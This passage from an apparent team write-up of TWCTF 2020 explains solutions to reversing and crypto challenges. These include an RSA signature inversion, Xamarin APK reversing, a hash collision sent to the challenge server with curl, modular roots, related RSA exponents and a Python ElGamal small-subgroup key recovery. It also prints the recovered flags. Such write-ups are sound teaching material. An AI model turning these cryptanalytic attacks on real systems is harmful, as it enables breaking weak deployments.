Translating via google: &lt;code&gt;I&#39;m pu â†’ I love you&lt;/code&gt;. WTF?&lt;/p&gt;

&lt;h2 id=&#34;reversing-is-amazing-reverse-126-points&#34;&gt;Reversing iS Amazing (Reverse, 126 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Open the binary with IDA. We can see that the binary signs &lt;code&gt;argv[1]&lt;/code&gt; (which should be the flag) with RSA, then compares the signature with a given value. With that said, we have a RSA private key.&lt;/p&gt;

&lt;p&gt;Since we have the private key and the target signature (which the message is signed instead of its digest), we can simply recover the message by computing $s^e\ \text{mod}\ n$. Unpadding the message we have &lt;code&gt;TWCTF{Rivest_Shamir_Adleman}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;tamarin-reverse-224-points&#34;&gt;Tamarin (Reverse, 224 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;We are given an APK for the challenge. As how we work on every single Android reversing challenge, we use &lt;code&gt;apktool&lt;/code&gt; to decode the file. Noticing that it is developed in Xamarin, we use the Github repository &lt;a href=&#34;https://github.com/tjg1/mono_unbundle&#34;&gt;tjg1/mono_unbundle&lt;/a&gt; to unbundle &lt;code&gt;dll.so&lt;/code&gt; to a C# DLL source file. We now have source codes to read!&lt;/p&gt;

&lt;p&gt;In particular we have this function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; Func4(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; flag) {
    ParallelOptions parallelOptions = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ParallelOptions {
        MaxDegreeOfParallelism = &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
    };
    &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] bytes = Encoding.ASCII.GetBytes(flag);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; length = flag.Length;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((length &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) != &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
        Array.Resize&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;ref&lt;/span&gt; bytes, length + (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; - (length &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)));
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = length; i &amp;lt; bytes.Length; i++) {
        bytes[i] = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bytes.Length != Check.equations_arr.GetLength(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) * &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt; lockObj = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;();
    ConcurrentBag&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&amp;gt; checkResults = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ConcurrentBag&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&amp;gt;();
    List&amp;lt;List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;&amp;gt; list = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; List&amp;lt;List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;&amp;gt;();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &amp;lt; Check.equations_arr.GetLength(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); j++) {
        List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt; list2 = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;();
        list2.Add(BitConverter.ToUInt32(bytes, j * &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;));
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; k = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; k &amp;lt; Check.equations_arr.GetLength(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;); k++) {
            list2.Add(Check.equations_arr[j, k]);
        }
        list.Add(list2);
    }
    Parallel.ForEach&amp;lt;List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;&amp;gt;(list, parallelOptions, &lt;span style=&#34;color:#66d9ef&#34;&gt;delegate&lt;/span&gt;(List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt; equation) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt; lockObj = lockObj;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;lock&lt;/span&gt; (lockObj) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt; num = Check.Func3();
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; l = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; l &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;; l++) {
                num = Check.Func2(equation, num, equation.Count - &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
            }
            checkResults.Add(num == equation[equation.Count - &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
        }
    });
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Enumerable.All&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&amp;gt;(checkResults.ToArray(), (&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; x) =&amp;gt; x);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Additionally, we have a &lt;code&gt;equations_arr&lt;/code&gt; which is a $22\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 2&lt;sup&gt;32&lt;/sup&gt;):&lt;/p&gt;

&lt;p&gt;First we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.&lt;/p&gt;

&lt;p&gt;What&#39;s $n$? It is the output of &lt;code&gt;Check.Func3()&lt;/code&gt; and it actually is a random number... Is it even solvable?&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-23-twctf/pepe-sweat.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (&lt;em&gt;a bit means few sheets of paper and a lot of time&lt;/em&gt;), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.&lt;/p&gt;

&lt;p&gt;After all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;easyhash-crypto-75-points&#34;&gt;easy-hash (Crypto, 75 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The challenge defines a new hash algorithm, &lt;code&gt;easy_hash&lt;/code&gt;. It is defined by the following function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;easy_hash&lt;/span&gt;(x):
    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(x) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
        m &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;, x[i:i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
        m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; m&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The objective is to find a collision pair: for &lt;code&gt;twctf: please give me the flag of 2020&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Mathematically, if $M=m_1m_2m_3\dots m_n$, then&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\text{easy\_hash}(M):=\sum_{i=1}^{n-3}\left(\text{0x100}^3m_{i+3}+\text{0x100}^2m_{i+2}+\text{0x100}m_{i+1}+m_i\right).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Equivalently it would be&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{aligned}
\text{easy\_hash}(M) := m_1&amp; + \text{0x101} m_2 + \text{0x10101} m_3 + \text{0x1010101}\sum_{i=4}^{n-3}m_i \\
\end{aligned}
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Hence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that &lt;code&gt;&amp;quot;f&amp;quot; = &amp;quot;F&amp;quot; + &amp;quot; &amp;quot;&lt;/code&gt;, we can simply replace &lt;code&gt;flag&lt;/code&gt; into &lt;code&gt;F lag&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://crypto01.chal.ctf.westerns.tokyo/&amp;#34;&lt;/span&gt; -X POST --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;twctf: please give me the F lag of 2020&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Congrats! The flag is TWCTF{colorfully_decorated_dream}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;sqrt-crypto-216-points&#34;&gt;sqrt (Crypto, 216 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;In this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \equiv m^{2^{64}}\ (\text{mod}\ p)$ - and the objective is of course to recover the flag $m$.&lt;/p&gt;

&lt;p&gt;My first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.&lt;/p&gt;

&lt;p&gt;Fortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \equiv 1\ (\text{mod}\ p-1)$. Then $c^d \equiv m^{d\cdot 2^{64}}\equiv m^{2^{30}}\ (\text{mod}\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.&lt;/p&gt;

&lt;p&gt;Instead we compute a 2&lt;sup&gt;30&lt;/sup&gt;-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - &lt;code&gt;TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;twind-crypto-172-points&#34;&gt;twin-d (Crypto, 172 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{cases}\begin{aligned}
e_2 (d+2) &amp;\equiv 1\ \left(\text{mod}\ \phi(n)\right) \\
e_1 d &amp;\equiv 1\ \left(\text{mod}\ \phi(n)\right)
\end{aligned}\end{cases}.
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;harrier&lt;/em&gt; has observed that $e_2d \equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[0 \equiv e_1(e_2d) - e_2(e_1d) \equiv e_1(1-2e_2)-e_2 \equiv e_1 - e_2 - 2e_1e_2\ \left(\text{mod}\ \phi(n)\right).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;In this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\phi(n)$. We can compute an equivalent private key $d&#39;$ by computing $ed&#39; \equiv 1 \ \left(\text{mod}\ \phi(n)\right)$. Hence it suffices to recover the flag from the ciphertext - &lt;code&gt;TWCTF{even_if_it_is_f4+e}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;the-melancholy-of-alice-crypto-242-points&#34;&gt;The Melancholy of Alice (Crypto, 242 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;In this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;N &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;generateKey&lt;/span&gt;():
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getStrongPrime(N)
    q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getRandomRange(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, q)
    g &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(g, x, p)
    pk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p, q, g, h)
    sk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (pk, sk)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(m, pk):
    (p, q, g, h) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pk
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getRandomRange(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, q)
    c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(g, r, p)
    c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pow(h, r, p) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (c1, c2)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn&#39;t it?&lt;/p&gt;

&lt;p&gt;Without any clues, we were messing around. Eventually we tried to factorize $p-1$.&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-23-twctf/factordb.png&#34;/&gt; 
&lt;/figure&gt;


&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-23-twctf/jackie-chan-what.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;&lt;em&gt;Wait what?&lt;/em&gt; Isn&#39;t $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be &lt;em&gt;safe&lt;/em&gt; but not &lt;em&gt;strong&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Okay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# p, q, g, h are redacted to save up some spaces&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/ciphertext.txt&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(eval, f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)))

r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5710354319&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dlog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bsgs(pow(g, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p), pow(h, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p), p, r)
&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; pow(g, x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pow(h, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p)

ms &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
m_map &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; m: pow(m, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p), range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)))
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(m_map)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c1, c2 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cs:
    c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(c1, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p)
    c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(c2, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;r, p)

    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; c2 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; powmod(c1, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x, p) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; m_map
    ms &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; bytes([m_map&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(m) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;])
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(ms)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;xor-and-shift-encryptor-crypto-303-points&#34;&gt;XOR and shift encryptor (Crypto, 303 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is more like a PPC challenge instead of a cryptography challenge. There is a &lt;code&gt;randgen&lt;/code&gt; function, that serves as the core of the challenge, defined below:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;randgen&lt;/span&gt;():
  &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; s,p
  a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
  b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
  c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;
  s0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s[p]
  p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
  s1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s[p]
  res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (s0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; s1) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
